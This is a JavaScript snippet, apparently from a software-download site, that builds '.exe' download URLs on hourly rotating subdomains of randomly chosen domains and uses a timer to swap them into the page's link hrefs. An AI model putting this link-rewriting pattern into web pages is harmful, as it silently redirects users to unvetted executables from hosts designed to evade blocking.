_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all = false;
function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_geturl(SoftID, q, title){
	if(typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'){
        var i = Math.floor(Math.random() * _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming.length ); //0-2的随机数
        var yumy2 = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming[i];
		_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all = true   //是否已经加载
	}else{
		var yumy = ['wjLkj.com','yyk2.com','qtj5.com'];
		var i = Math.floor(Math.random()*3);
		var yumy2 = yumy[i];
	}
	var ysDownUrl = 'http://down'+ parseInt( (Date.parse(new Date())/1000 - 1451577600) / 3600 ) + '.' + yumy2+'/?/'+SoftID+'/'+q+'/'+title+'.exe';
	return ysDownUrl;
}
function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_returl(element, SoftID, q, title){
	var _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1 = 0;
	var interval_time = setInterval(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_seturl,50);
	
	function _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_seturl(){
		_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1++;
		if(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_jici1>40 || typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'  ){
				if(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_all === true){
					window.clearInterval(interval_time);
					return;
				}
                window.clearInterval(interval_time);
                if(typeof(_ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming) == 'object'){
                    var i = Math.floor(Math.random() * _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming.length ); //0-2的随机数
                    var yumy2 = _ysJk2JHe1fwsu71A1HqdCuWMbbAwYh_yuming[i];
                    yumy2 = 'http://down'+ parseInt( (Date.parse(new Date())/1000 - 1451577600) / 3600 ) + '.' + yumy2+'/?/'+SoftID+'/'+q+'/'+title+'.exe';
					try{
						if(element.length>0){
							for(var i=0;i<element.length;i++){
								element[i].href=yumy2; 
							}
						}else{
							element[i].href=yumy2; 
						}
					}catch(err){
						element.attr('href',yumy2);
					}
					
                }
            }
	}
	
}
function getNum(text){
			var value = text.replace(/[^0-9]/ig,"");
			return value;
		}
